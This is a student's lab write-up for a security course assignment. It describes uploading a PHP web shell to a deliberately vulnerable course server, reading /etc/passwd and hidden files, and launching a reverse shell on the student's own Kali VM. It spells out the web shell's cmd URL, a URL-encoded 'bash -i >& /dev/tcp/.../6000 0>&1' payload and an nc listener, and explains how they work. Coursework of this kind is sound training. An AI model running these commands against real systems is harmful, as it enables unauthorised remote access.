# Reverse Shell Assignment

#### Aadi Akyianu

## PART 1: INSTALLING A PHP WEB SHELL

1. Explain how you can execute the Linux command whoami on the server using your webshell. What result do you get when you execute that command?

To execute `whoami` on the server using my webshell:
- Firstly, upload the webshell to the website. 
- Next you will notice that the uploads are saved in the `uploadedimages` on the server.
- After that, to execute a command you need to supply that command to the command variable to the webshell you upload on the server.
- To do that you run `http://danger.jeffondich.com/uploadedimages/akyianun-webshell.php?cmd=whoami` in the address bar.
   - this locates the file you just uploaded to the server
   - the `?` lets the file know that there is a request being made
   - `cmd=whoami` means that the `cmd` variable in the request is set to `whoami`
   - next the webshell will execute that command and return the output to the server to display.

The result was `www-data.`

2. What is this webshell's \<pre\> tag for? (And more to the point, what happens if you leave it out?)

The \<pre\> tag is an HTML tag that lets it know that the output is preformatted. Leaving it out means that the new line characters and monospace font aren't included because HTML will process the text differently.

## PART 2: LOOKING AROUND

1. What directory is danger's website located in?

It is located in `/var/www/danger.jeffondich.com`. 


2. What are the names of all the user accounts on danger.jeffondich.com? How do you know?

I'm not completely sure what this question is asking. If it is asking about all the users on the machine or just the users that have access to the file.

In terms of all the users we have:

| Users  | Users    | Users           | Users            | Users         |
| ------ | -------- | --------------- | ---------------- | ------------- |
| root   | lp       | list            | systemd-timesync | sshd          |
| daemon | mail     | irc             | syslog           | pollinate     |
| bin    | news     | gnats           | \_apt            | landscape     |
| sys    | uucp     | nobody          | tss              | fwupd-refresh |
| sync   | proxy    | systemd-network | uuidd            | jeff          |
| games  | www-data | systemd-resolve | tcpdump          | postgres      |
| man    | backup   | messagebus      | usbmux           | bullwinkle    |

I figured this out by looking at the `/etc/passwd` file.

Regarding the user accounts that have access to `danger.jeffondich.com` that is:
- jeff 
- www-data

I figured that out by running `ls -l` on `/var/www/danger.jeffondich.com` to see which users own the files.

3. Do you have access to the file /etc/passwd? What's in it?

Yes, we have read-only access to it. \
It contains information about all the users on the server running `danger.jeffondich.com` \
It contains the following info:
- the username
- hashed password or a x if the password is in /etc/shadow.
- uid (user id)
- gid (group id)
- Information about the user (Full name, room number, phone number etc)
- user's home directory
- user's login shell (e.g bash, zsh, tsh etc)

4. Do you have access to the file /etc/shadow? What's in it? (You'll have to look onliine for the answer to that second question, since the answer to the first is no.)

No, I do not have access to the /etc/shadow file as it is not readable to anyone other than root. \
The /etc/shadow file contains the following:
- the username
- the encrypted password (or `*/!` if the user does not have a password)
- the last time the password was changed
- the maximum age of the password
- the minimum age of the password
- the warning period (time before password expires that the user is warned about changing it)
- the inactivity period (time after password expires before the account is disabled)
- the expiration date (the date when the account is disabled)

5. There may be some secret files scattered around. See how many you can find and report on your discoveries.

   - Found kindasecret.txt in `/var/www/danger.jeffondich.com/secret`
   - Also found secret.txt in `/var/www/danger.jeffondich.com/youwontfindthiswithgobuster/secret.txt`

6. [Optional] Report on anything else interesting you discover.
   - there is a tar file with past students' attacks in it. 
      - do not untar it (otherwise Jeff will have a lot of files to clean up 😬)

## PART 4: LAUNCHING A REVERSE SHELL

1. What is the IP address of your Kali VM (the target machine)? How did you find out?

Kali IP address: `192.168.204.129`
- I found this out by using `ip a` and looking for the `inet` address in the `eth0` interface. 
- This is the interface Kali uses to communicate with my laptop. 
- Additionally the only other addresses are for localhost and for the docker interface.

2. What are the IP addresses of your host OS (the attacking machine)? How did you find out? Which one should you use to communicate with Kali and why?

#### Host IP addresses

- **lo0:** 127.0.0.1
- **en0:** 10.133.0.147
- **feth1196:** 172.24.252.201
- **bridge100:** 172.16.207.1
- **bridge101:** 192.168.204.1

I found this out by running `ifconfig` on my laptop and filtering for the `inet` addresses.

The address I would use to communicate with Kali is `192.168.204.1`. This is because it is the only `192.168.x.x` address which means it is the only address in the same local subnet as my Kali machince which also has a `192.168.x.x` address.

3. On your host OS (the attacker), pick any port number between 5000 and 10000 and run `nc -l -p YOUR_CHOSEN_PORT`.

Ran `nc -lvn 6000` (on my Mac `nc` does not work with the `-l` and `-p` options together)


4. In a browser on your host machine, use your web shell to go to this crazy URL.

   ```
   http://KALI_IP/YOUR_WEBSHELL.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/YOUR_HOST_OS_IP/YOUR_CHOSEN_PORT%200%3E%261%22
   ```

   Note that "YOUR_WEBSHELL" should of course be replaced by the name of your web shell you installed in the Apache2 home directory on Kali during Part 3.

Ran 
```
http://192.168.204.129/akyianun-webshell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.204.1/6000%200%3E%261%22
```


5. Go back and look at your nc -l -p terminal on your host OS (attacking machine). Do you have a shell now? Is it letting you execute commands on Kali? How do you know it's Kali?

Yes, I finally got a shell! \
It is letting me execute commands. 
- I ran `ip a` which produced the same ip address that Kali has. 
- I also ran `ls` which showed that it contained my webshell `akyianun-webshell.php` in the `/var/www/html` folder. 
- Finally, just to be on the safe side I ran `su kali` and was able to login as `kali` and view the special files that I have in `/home/kali` and in my `Shared-Kali` folder.

6. What are all those % codes in the URL you used?

They are special characters similar to `\` in bash. It lets the browser know to read the next two characters as hexdecimal rather than plain ascii text.

7. Write a brief description, probably including a diagram, explaining how this reverse shell is functioning.

First, you (the attacker) manage to get your webshell on the target server (kali). Then once you set up `nc` to listen on a specific port, you are primed to have the server initiate a connection with you. This is especially useful if initiating a connection with the server is not possible (it is in a local network, other firewall rules etc). 

Once you type in the url from step 4 in your browser, the server immediately begins to execute the php code which involves running the bash command that you enter. 
Breaking down the command further
```bash
bash -c bash -i >&
```
The result of this is that the server creates an interactive bash shell and routes stdout and stderr to the same place. 

```bash
/dev/tcp/192.168.204.1/6000
```
This establishes a TCP connection to your local machine at the specified port. It is able to establish this connection with your machine because you are listening on that port. This is where that output is redirected.

```bash
0>&1
```
This points stdin to the same place that stdout and stdin were pointing. (which is why typing in a command results int hat command being echoed back).

Thus you now have an interactive bash shell in write mode that is reading stdin from your machine and returning the output of that back to your machine.
